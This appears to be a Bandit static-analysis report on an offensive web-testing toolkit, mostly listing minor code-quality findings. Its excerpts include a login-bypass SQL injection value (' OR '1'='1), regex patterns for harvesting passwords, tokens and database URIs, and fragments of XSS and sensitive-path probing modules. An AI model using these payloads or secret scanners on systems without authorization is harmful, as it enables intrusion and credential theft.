+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/login_bypass.py:531:28
+530	                            "username": "' OR '1'='1",
+531	                            "password": "' OR '1'='1",
+532	                        }
+533	                    )
+534	                    log_success("SQLi bypass found with ' OR '1'='1")
+535	
+536	        log_success(
+537	            f"Login Bypass scan completed. Found {len(vulnerabilities)} vulnerabilities."
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/mobile_security.py:30:8
+29	                    log_warning("Potential dangerous permissions found")
+30	        except:
+31	            pass
+32	
+
+--------------------------------------------------
+>> Issue: [B108:hardcoded_tmp_directory] Probable insecure usage of temp file/directory.
+   Severity: Medium   Confidence: Medium
+   CWE: CWE-377 (https://cwe.mitre.org/data/definitions/377.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b108_hardcoded_tmp_directory.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/nikto_style.py:102:12
+101	            "/logs/",
+102	            "/tmp/",
+103	            "/temp/",
+104	        ]
+105	
+106	        for path in paths:
+107	            url = f"{self.target}{path}"
+108	            try:
+109	                resp = requests.get(url, timeout=5, allow_redirects=False)
+110	                if resp.status_code == 200:
+111	                    self.vulnerabilities.append(
+112	                        {
+113	                            "type": "Sensitive File Exposure",
+114	                            "severity": "High",
+115	                            "path": path,
+116	                            "status": resp.status_code,
+117	                            "url": url,
+118	                        }
+119	                    )
+120	                    log_success(f"🔥 Found sensitive path: {path}")
+121	                elif self.verbose and resp.status_code != 404:
+122	                    log_debug(f"Path {path} -> {resp.status_code}")
+123	            except:
+124	                pass
+125	
+126	    def check_common_cves(self):
+127	        """Check for common CVEs"""
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/nikto_style.py:123:12
+122	                    log_debug(f"Path {path} -> {resp.status_code}")
+123	            except:
+124	                pass
+125	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/nikto_style.py:159:12
+158	                    log_success(f"🔥 {cve['name']} detected!")
+159	            except:
+160	                pass
+161	
+
+--------------------------------------------------
+>> Issue: [B104:hardcoded_bind_all_interfaces] Possible binding to all interfaces.
+   Severity: Medium   Confidence: Medium
+   CWE: CWE-605 (https://cwe.mitre.org/data/definitions/605.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b104_hardcoded_bind_all_interfaces.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/proxy.py:121:26
+120	        )
+121	        self.app.run(host="0.0.0.0", port=self.port, threaded=True)
+122	
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/race_condition.py:88:8
+87	                )
+88	        except:
+89	            pass
+90	
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'password["\']?\s*[:=]\s*["\']?[^"\']{4,32}["\']?'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/secret_scanner.py:37:12
+36	            "API Key Generic": r'api[_-]?key["\']?\s*[:=]\s*["\']?[0-9a-zA-Z]{16,64}["\']?',
+37	            "Password": r'password["\']?\s*[:=]\s*["\']?[^"\']{4,32}["\']?',
+38	            "Secret": r'secret["\']?\s*[:=]\s*["\']?[0-9a-zA-Z]{16,64}["\']?',
+39	            "Bearer Token": r"Bearer\s+[0-9a-zA-Z\-_.]+",
+40	            "Basic Auth": r"Basic\s+[0-9a-zA-Z+/=]+",
+41	            "MongoDB URI": r"mongodb://[a-zA-Z0-9]+:[^@]+@[a-zA-Z0-9]+\.mongodb\.net",
+42	            "MySQL Connection": r"mysql://[a-zA-Z0-9]+:[^@]+@[a-zA-Z0-9]+\.(com|net|org)",
+43	            "PostgreSQL Connection": r"postgresql://[a-zA-Z0-9]+:[^@]+@[a-zA-Z0-9]+\.(com|net|org)",
+44	            "Redis Connection": r"redis://[a-zA-Z0-9]+:[^@]+@[a-zA-Z0-9]+\.(com|net|org)",
+45	        }
+46	
+47	    def fetch_content(self, url):
+48	        """Fetch content from URL"""
+49	        try:
+50	            resp = requests.get(url, timeout=10, allow_redirects=False)
+51	            if resp.status_code == 200:
+52	                return resp.text
+53	            elif self.verbose:
+54	                log_debug(f"Status {resp.status_code} for {url}")
+55	        except Exception as e:
+56	            if self.verbose:
+57	                log_debug(f"Error fetching {url}: {e}")
+58	        return None
+59	
+60	    def scan_content(self, content, source):
+61	        """Scan content for secrets"""
+62	        for name, pattern in self.patterns.items():
+63	            matches = re.findall(pattern, content, re.IGNORECASE)
+64	            for match in matches:
+
+--------------------------------------------------
+>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'secret["\']?\s*[:=]\s*["\']?[0-9a-zA-Z]{16,64}["\']?'
+   Severity: Low   Confidence: Medium
+   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/secret_scanner.py:38:12
+37	            "Password": r'password["\']?\s*[:=]\s*["\']?[^"\']{4,32}["\']?',
+38	            "Secret": r'secret["\']?\s*[:=]\s*["\']?[0-9a-zA-Z]{16,64}["\']?',
+39	            "Bearer Token": r"Bearer\s+[0-9a-zA-Z\-_.]+",
+40	            "Basic Auth": r"Basic\s+[0-9a-zA-Z+/=]+",
+41	            "MongoDB URI": r"mongodb://[a-zA-Z0-9]+:[^@]+@[a-zA-Z0-9]+\.mongodb\.net",
+42	            "MySQL Connection": r"mysql://[a-zA-Z0-9]+:[^@]+@[a-zA-Z0-9]+\.(com|net|org)",
+43	            "PostgreSQL Connection": r"postgresql://[a-zA-Z0-9]+:[^@]+@[a-zA-Z0-9]+\.(com|net|org)",
+44	            "Redis Connection": r"redis://[a-zA-Z0-9]+:[^@]+@[a-zA-Z0-9]+\.(com|net|org)",
+45	        }
+46	
+47	    def fetch_content(self, url):
+48	        """Fetch content from URL"""
+49	        try:
+50	            resp = requests.get(url, timeout=10, allow_redirects=False)
+51	            if resp.status_code == 200:
+52	                return resp.text
+53	            elif self.verbose:
+54	                log_debug(f"Status {resp.status_code} for {url}")
+55	        except Exception as e:
+56	            if self.verbose:
+57	                log_debug(f"Error fetching {url}: {e}")
+58	        return None
+59	
+60	    def scan_content(self, content, source):
+61	        """Scan content for secrets"""
+62	        for name, pattern in self.patterns.items():
+63	            matches = re.findall(pattern, content, re.IGNORECASE)
+64	            for match in matches:
+65	                # Filter out common false positives
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:61:16
+60	            lambda: "".join(
+61	                random.choices(string.ascii_lowercase, k=random.randint(1, 10))
+62	            ),
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:61:57
+60	            lambda: "".join(
+61	                random.choices(string.ascii_lowercase, k=random.randint(1, 10))
+62	            ),
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:63:28
+62	            ),
+63	            lambda: "".join(random.choices(string.digits, k=random.randint(1, 10))),
+64	            lambda: "".join(
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:63:60
+62	            ),
+63	            lambda: "".join(random.choices(string.digits, k=random.randint(1, 10))),
+64	            lambda: "".join(
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:65:16
+64	            lambda: "".join(
+65	                random.choices(
+66	                    string.ascii_letters + string.digits, k=random.randint(1, 10)
+67	                )
+68	            ),
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:66:60
+65	                random.choices(
+66	                    string.ascii_letters + string.digits, k=random.randint(1, 10)
+67	                )
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:69:28
+68	            ),
+69	            lambda: "".join(random.choices(string.printable, k=random.randint(1, 10))),
+70	        ]
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:69:63
+68	            ),
+69	            lambda: "".join(random.choices(string.printable, k=random.randint(1, 10))),
+70	        ]
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:74:23
+73	        """Generate a random fuzzing payload"""
+74	        payload_type = random.choice(["string", "number", "special", "mixed"])
+75	        if payload_type == "string":
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:77:16
+76	            return "".join(
+77	                random.choices(string.ascii_letters, k=random.randint(1, 20))
+78	            )
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:77:55
+76	            return "".join(
+77	                random.choices(string.ascii_letters, k=random.randint(1, 20))
+78	            )
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:80:23
+79	        elif payload_type == "number":
+80	            return str(random.randint(0, 10 ** random.randint(1, 5)))
+81	        elif payload_type == "special":
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:80:47
+79	        elif payload_type == "number":
+80	            return str(random.randint(0, 10 ** random.randint(1, 5)))
+81	        elif payload_type == "special":
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:82:27
+81	        elif payload_type == "special":
+82	            return "".join(random.choices(self.base_payloads, k=random.randint(1, 5)))
+83	        else:
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:82:64
+81	        elif payload_type == "special":
+82	            return "".join(random.choices(self.base_payloads, k=random.randint(1, 5)))
+83	        else:
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:85:16
+84	            return "".join(
+85	                random.choices(
+86	                    string.ascii_letters + string.digits + "'\"\\/;",
+87	                    k=random.randint(1, 15),
+88	                )
+89	            )
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/smart_fuzzing.py:87:22
+86	                    string.ascii_letters + string.digits + "'\"\\/;",
+87	                    k=random.randint(1, 15),
+88	                )
+
+--------------------------------------------------
+>> Issue: [B324:hashlib] Use of weak MD5 hash for security. Consider usedforsecurity=False
+   Severity: High   Confidence: High
+   CWE: CWE-327 (https://cwe.mitre.org/data/definitions/327.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b324_hashlib.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/tech_detect.py:92:35
+91	                if resp.status_code == 200:
+92	                    favicon_hash = hashlib.md5(resp.content).hexdigest()
+93	                    if favicon_hash in self.favicon_hashes:
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/tech_detect.py:99:12
+98	                        log_success(f"Found {tech} via favicon hash")
+99	            except:
+100	                pass
+101	
+
+--------------------------------------------------
+>> Issue: [B324:hashlib] Use of weak MD5 hash for security. Consider usedforsecurity=False
+   Severity: High   Confidence: High
+   CWE: CWE-327 (https://cwe.mitre.org/data/definitions/327.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b324_hashlib.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/version_scanner.py:670:35
+669	                if resp and resp.status_code == 200:
+670	                    favicon_hash = hashlib.md5(resp.content).hexdigest()
+671	                    for service, info in self.favicon_hashes.items():
+
+--------------------------------------------------
+>> Issue: [B311:blacklist] Standard pseudo-random generators are not suitable for security/cryptographic purposes.
+   Severity: Low   Confidence: High
+   CWE: CWE-330 (https://cwe.mitre.org/data/definitions/330.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b311-random
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/modules/web/xss.py:356:28
+355	            log_info(f"Testing parameter: {param}")
+356	            test_payloads = random.sample(
+357	                all_payloads, min(max_payloads, len(all_payloads))
+358	            )
+359	            for i, payload in enumerate(test_payloads):
+
+--------------------------------------------------
+>> Issue: [B404:blacklist] Consider possible security implications associated with the subprocess module.
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/scripts/automate.py:5:0
+4	import os
+5	import subprocess
+6	import sys
+
+--------------------------------------------------
+>> Issue: [B602:subprocess_popen_with_shell_equals_true] subprocess call with shell=True identified, security issue.
+   Severity: High   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b602_subprocess_popen_with_shell_equals_true.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/scripts/automate.py:21:21
+20	        try:
+21	            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+22	            if self.verbose:
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/scripts/exploits.py:32:12
+31	                    return True
+32	            except:
+33	                pass
+34	        return False
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/scripts/exploits.py:51:12
+50	                    return True
+51	            except:
+52	                pass
+53	        return False
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/scripts/exploits.py:70:12
+69	                    return True
+70	            except:
+71	                pass
+72	        return False
+
+--------------------------------------------------
+>> Issue: [B110:try_except_pass] Try, Except, Pass detected.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/scripts/exploits.py:85:12
+84	                    return True
+85	            except:
+86	                pass
+87	        return False
+
+--------------------------------------------------
+>> Issue: [B101:assert_used] Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b101_assert_used.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/tests/test_basic.py:11:4
+10	    from core.network import resolve_domain
+11	    assert True
+12	
+
+--------------------------------------------------
+>> Issue: [B101:assert_used] Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b101_assert_used.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/tests/test_basic.py:19:4
+18	    from modules.scan.portscan import PortScanner
+19	    assert True
+20	
+
+--------------------------------------------------
+>> Issue: [B101:assert_used] Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b101_assert_used.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/tests/test_basic.py:25:4
+24	        content = f.read()
+25	    assert "v2.0.0" in content
+26	
+
+--------------------------------------------------
+>> Issue: [B101:assert_used] Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b101_assert_used.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/tests/test_basic.py:31:4
+30	    set_color_mode("never")
+31	    assert use_colors() == False
+32	    set_color_mode("always")
+
+--------------------------------------------------
+>> Issue: [B101:assert_used] Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.
+   Severity: Low   Confidence: High
+   CWE: CWE-703 (https://cwe.mitre.org/data/definitions/703.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b101_assert_used.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/tests/test_basic.py:33:4
+32	    set_color_mode("always")
+33	    assert use_colors() == True
+34	    set_color_mode("auto")
+
+--------------------------------------------------
+>> Issue: [B404:blacklist] Consider possible security implications associated with the subprocess module.
+   Severity: Low   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/webui.py:4:0
+3	import os
+4	import subprocess
+5	
+
+--------------------------------------------------
+>> Issue: [B602:subprocess_popen_with_shell_equals_true] subprocess call with shell=True identified, security issue.
+   Severity: High   Confidence: High
+   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b602_subprocess_popen_with_shell_equals_true.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/webui.py:140:17
+139	        result = subprocess.run(
+140	            cmd, shell=True, capture_output=True, text=True, timeout=300
+141	        )
+142	        output = result.stdout + result.stderr
+143	    except subprocess.TimeoutExpired:
+
+--------------------------------------------------
+>> Issue: [B104:hardcoded_bind_all_interfaces] Possible binding to all interfaces.
+   Severity: Medium   Confidence: Medium
+   CWE: CWE-605 (https://cwe.mitre.org/data/definitions/605.html)
+   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b104_hardcoded_bind_all_interfaces.html
+   Location: /data/data/com.termux/files/home/GOODS-DRAGON/webui.py:152:17
+151	if __name__ == "__main__":
+152	    app.run(host="0.0.0.0", port=5000, debug=False)
+
+--------------------------------------------------
+
+Code scanned:
+	Total lines of code: 17654
+	Total lines skipped (#nosec): 0
+	Total potential issues skipped due to specifically being disabled (e.g., #nosec BXXX): 0
+
+Run metrics:
+	Total issues (by severity):
+		Undefined: 0
+		Low: 187
+		Medium: 8
+		High: 13
+	Total issues (by confidence):
+		Undefined: 0
+		Low: 3
+		Medium: 76
+		High: 129
+Files skipped (0):
